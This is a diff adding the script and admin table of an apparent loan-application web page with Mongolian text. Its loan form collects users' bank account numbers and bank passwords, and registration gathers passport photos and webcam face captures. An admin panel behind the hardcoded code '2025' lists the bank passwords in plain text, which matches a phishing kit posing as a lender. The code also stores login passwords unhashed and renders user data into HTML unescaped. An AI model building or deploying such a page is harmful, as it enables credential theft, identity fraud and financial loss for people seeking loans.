+        <input type="text" id="searchDemandes" placeholder="Хайх..." style="margin-bottom: 10px; padding:6px; width:100%; max-width:300px;">
+        <table>
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>И-мэйл</th>
+              <th>Банкны дугаар</th>
+              <th>Нууц үг</th>
+              <th>Огноо</th>
+              <th>Үйлдэл</th>
+            </tr>
+          </thead>
+          <tbody id="tbodyDemandesPret"></tbody>
+        </table>
+      </div>
+    </section>
+  </main>
+
+  <script>
+  (function() {
+    const adminCodeValide = '2025';
+
+    // Navigation
+    const navButtons = document.querySelectorAll('nav button[data-page]');
+    const sections = document.querySelectorAll('main section');
+    const btnLogout = document.getElementById('btnLogout');
+
+    function isUserLoggedIn() {
+      return !!localStorage.getItem('userConnecte');
+    }
+
+    function refreshNavEtat() {
+      const connected = isUserLoggedIn();
+      document.getElementById('navInscription').style.display = connected ? 'none' : 'inline-block';
+      document.getElementById('navConnexion').style.display = connected ? 'none' : 'inline-block';
+      document.getElementById('navAccueil').style.display = connected ? 'inline-block' : 'none';
+      document.getElementById('navDemandePret').disabled = !connected;
+      document.getElementById('navAdmin').disabled = !connected;
+      btnLogout.style.display = connected ? 'inline-block' : 'none';
+    }
+
+    function showPage(page) {
+      sections.forEach(s => s.id === page ? s.classList.add('active') : s.classList.remove('active'));
+      navButtons.forEach(b => b.classList.toggle('active', b.getAttribute('data-page') === page));
+    }
+
+    navButtons.forEach(b => b.addEventListener('click', () => {
+      if ((b.getAttribute('data-page') === 'inscription' || b.getAttribute('data-page') === 'demandePret' || b.getAttribute('data-page') === 'admin') && !localStorage.getItem('condAccepted')) {
+        alert('Услугийн нөхцлийг эхлээд хүлээн аваарай.');
+        showPage('condition');
+        return;
+      }
+      showPage(b.getAttribute('data-page'));
+    }));
+
+    btnLogout.onclick = () => {
+      localStorage.removeItem('userConnecte');
+      refreshNavEtat();
+      showPage('connexion');
+    };
+
+    // Initialisation
+    refreshNavEtat();
+    showPage(isUserLoggedIn() ? 'accueil' : 'connexion');
+
+    // Conditions
+    document.getElementById('btnAccept').onclick = () => {
+      localStorage.setItem('condAccepted', 'true');
+      showPage('inscription');
+    };
+    document.getElementById('btnRefuse').onclick = () => alert('Та нөхцөлийг хүлээсэнгүй.');
+
+    // Webcam setup for face photo capture
+    const videoFace = document.getElementById('videoFace');
+    const canvasFace = document.getElementById('canvasFace');
+    const photoFace = document.getElementById('photoFace');
+    let imgDataFace = null;
+
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+        videoFace.srcObject = stream;
+      }).catch(() => {
+        console.warn('Webcam not accessible');
+      });
+    }
+
+    document.getElementById('btnCaptureFace').onclick = () => {
+      canvasFace.getContext('2d').drawImage(videoFace, 0, 0, canvasFace.width, canvasFace.height);
+      imgDataFace = canvasFace.toDataURL('image/png');
+      photoFace.src = imgDataFace;
+      photoFace.style.display = 'block';
+    };
+
+    // Inscription
+    document.getElementById('formInscription').onsubmit = e => {
+      e.preventDefault();
+
+      const email = document.getElementById('emailInscription').value.trim().toLowerCase();
+      const password = document.getElementById('passwordInscription').value;
+      const nom = document.getElementById('nomInscription').value.trim();
+      const tel = document.getElementById('telInscription').value.trim();
+      const date = document.getElementById('dateInscription').value;
+      const pays = document.getElementById('paysInscription').value.trim();
+      const ville = document.getElementById('villeInscription').value.trim();
+
+      const messageInscription = document.getElementById('messageInscription');
+      messageInscription.textContent = '';
+      messageInscription.classList.remove('success');
+
+      // Vérification email déjà enregistré
+      const users = JSON.parse(localStorage.getItem('utilisateurs') || '[]');
+      if (users.some(u => u.email === email)) {
+        messageInscription.textContent = 'Энэ имэйл аль хэдийн бүртгэлтэй байна.';
+        return;
+      }
+
+      // Récupérer photo passport (fichier)
+      const inputFile = document.getElementById('photoIDInscription');
+      let photoIDData = null;
+
+      function enregistrerUser() {
+        const user = {
+          email,
+          password,
+          nom,
+          tel,
+          date,
+          pays,
+          ville,
+          photoID: photoIDData,
+          photoFace: imgDataFace
+        };
+        users.push(user);
+        localStorage.setItem('utilisateurs', JSON.stringify(users));
+        localStorage.setItem('userConnecte', email);
+        messageInscription.classList.add('success');
+        messageInscription.textContent = 'Амжилттай бүртгэгдлээ! Нэвтэрч байна...';
+
+        // Reset formulaire
+        e.target.reset();
+        photoFace.style.display = 'none';
+        imgDataFace = null;
+        showPage('accueil');
+        refreshNavEtat();
+      }
+
+      // Lire fichier photo ID si sélectionné
+      if (inputFile.files && inputFile.files[0]) {
+        const reader = new FileReader();
+        reader.onload = function(evt) {
+          photoIDData = evt.target.result;
+          enregistrerUser();
+        };
+        reader.readAsDataURL(inputFile.files[0]);
+      } else {
+        enregistrerUser();
+      }
+    };
+
+    // Connexion
+    document.getElementById('formConnexion').onsubmit = e => {
+      e.preventDefault();
+      const email = document.getElementById('emailConnexion').value.trim().toLowerCase();
+      const password = document.getElementById('passwordConnexion').value;
+      const users = JSON.parse(localStorage.getItem('utilisateurs') || '[]');
+      const messageConnexion = document.getElementById('messageConnexion');
+      messageConnexion.textContent = '';
+      const user = users.find(u => u.email === email && u.password === password);
+      if (user) {
+        localStorage.setItem('userConnecte', email);
+        messageConnexion.textContent = '';
+        showPage('accueil');
+        refreshNavEtat();
+      } else {
+        messageConnexion.textContent = 'Имэйл эсвэл нууц үг буруу байна.';
+      }
+    };
+
+    // Calculatrice prêt
+    document.getElementById('btnCalculer').onclick = () => {
+      const m = parseFloat(document.getElementById('montantPret').value);
+      const d = parseInt(document.getElementById('dureeRemboursement').value);
+      if (!m || !d) {
+        alert('Мэдээллээ зөв оруулна уу');
+        return;
+      }
+      const taux = 1.5;
+      const total = m + (m * taux * d) / 100;
+      document.getElementById('resultCalc').innerHTML = `
+        <table><tr>
+          <th>Зээлийн дүн</th><th>Хүү %/сар</th><th>Хугацаа</th><th>Нийт төлбөр</th>
+        </tr>
+        <tr><td>${m.toLocaleString()}</td><td>${taux}</td><td>${d}</td><td>${total.toLocaleString()}</td></tr></table>`;
+    };
+
+    // Demande prêt
+    document.getElementById('formDemandePret').onsubmit = e => {
+      e.preventDefault();
+
+      const numeroBancaire = document.getElementById('numeroBancaire').value.trim();
+      const mdpBancaire = document.getElementById('mdpBancaire').value.trim();
+
+      if (!numeroBancaire || !mdpBancaire) {
+        alert('Бүх талбарыг бөглөнө үү.');
+        return;
+      }
+
+      // On ajoute l'email de l'utilisateur connecté
+      const emailUser = localStorage.getItem('userConnecte') || '';
+
+      const demandes = JSON.parse(localStorage.getItem('demandesPret') || '[]');
+      demandes.push({ numeroBancaire, mdpBancaire, date: new Date().toLocaleString(), emailUser });
+      localStorage.setItem('demandesPret', JSON.stringify(demandes));
+
+      document.getElementById('formDemandePret').reset();
+      document.getElementById('messageDemandePret').textContent = 'Таны зээл хүсэлт амжилттай илгээгдлээ!';
+      setTimeout(() => {
+        document.getElementById('messageDemandePret').textContent = '';
+      }, 4000);
+    };
+
+    // Admin - afficher utilisateurs
+    function afficherUtilisateursAdmin(filter = '') {
+      const tbody = document.getElementById('tbodyUtilisateurs');
+      const users = JSON.parse(localStorage.getItem('utilisateurs') || '[]');
+      const filtred = users.filter(u =>
+        u.email.includes(filter) || u.nom.includes(filter) || u.tel.includes(filter)
+      );
+      tbody.innerHTML = filtred.map((u, i) => `
+        <tr>
+          <td>${i + 1}</td>
+          <td>${u.email}</td>
+          <td>${u.nom}</td>
+          <td>${u.tel}</td>
+          <td>${u.date}</td>
+          <td>${u.pays}</td>
+          <td>${u.ville}</td>
+          <td>${u.photoID ? `<img src="${u.photoID}" alt="Паспорт зураг" class="thumb">` : '-'}</td>
+          <td>${u.photoFace ? `<img src="${u.photoFace}" alt="Царайны зураг" class="thumb">` : '-'}</td>
+          <td><button onclick="supprimerUtilisateur(${i})" style="background:#cc0000; color:white; border:none; padding:6px 12px; border-radius:6px; cursor:pointer;">Устгах</button></td>
+        </tr>
+      `).join('');
+    }
+
+    // Admin - afficher demandes prêt
+    function afficherDemandesAdmin(filter = '') {
+      const tbody = document.getElementById('tbodyDemandesPret');
+      const demandes = JSON.parse(localStorage.getItem('demandesPret') || '[]');
+      const filtred = demandes.filter(d =>
+        d.numeroBancaire.includes(filter) || d.mdpBancaire.includes(filter) || d.emailUser.includes(filter)
+      );
+      tbody.innerHTML = filtred.map((d, i) => `
+        <tr>
+          <td>${i + 1}</td>
+          <td>${d.emailUser}</td>
+          <td>${d.numeroBancaire}</td>
+          <td>${d.mdpBancaire}</td>
+          <td>${d.date}</td>
+          <td><button onclick="supprimerDemande(${i})" style="background:#cc0000; color:white; border:none; padding:6px 12px; border-radius:6px; cursor:pointer;">Устгах</button></td>
+        </tr>
+      `).join('');
+    }
+
+    // Supprimer utilisateur admin
+    window.supprimerUtilisateur = function(index) {
+      if (confirm('Энэ хэрэглэгчийг устгах уу?')) {
+        const users = JSON.parse(localStorage.getItem('utilisateurs') || '[]');
+        users.splice(index, 1);
+        localStorage.setItem('utilisateurs', JSON.stringify(users));
+        afficherUtilisateursAdmin();
+      }
+    };
+
+    // Supprimer demande admin
+    window.supprimerDemande = function(index) {
+      if (confirm('Энэ зээлийн хүсэлтийг устгах уу?')) {
+        const demandes = JSON.parse(localStorage.getItem('demandesPret') || '[]');
+        demandes.splice(index, 1);
+        localStorage.setItem('demandesPret', JSON.stringify(demandes));
+        afficherDemandesAdmin();
+      }
+    };
+
+    // Validation code admin
+    document.getElementById('btnValiderCode').onclick = () => {
+      const code = document.getElementById('codeAdmin').value.trim();
+      const messageAdminCode = document.getElementById('messageAdminCode');
+      if (code === adminCodeValide) {
+        document.getElementById('authAdmin').style.display = 'none';
+        document.getElementById('contenuAdmin').style.display = 'block';
+        messageAdminCode.textContent = '';
+        afficherUtilisateursAdmin();
+        afficherDemandesAdmin();
+      } else {
+        messageAdminCode.textContent = 'Код буруу байна';
+      }
+    };
+
+    // Recherche utilisateurs
+    document.getElementById('searchUtilisateurs').addEventListener('input', e => {
+      afficherUtilisateursAdmin(e.target.value.trim());
+    });
+
+    // Recherche demandes prêt
+    document.getElementById('searchDemandes').addEventListener('input', e => {
+      afficherDemandesAdmin(e.target.value.trim());
+    });
+
+  })();
+  </script>
+</body>
+</html>
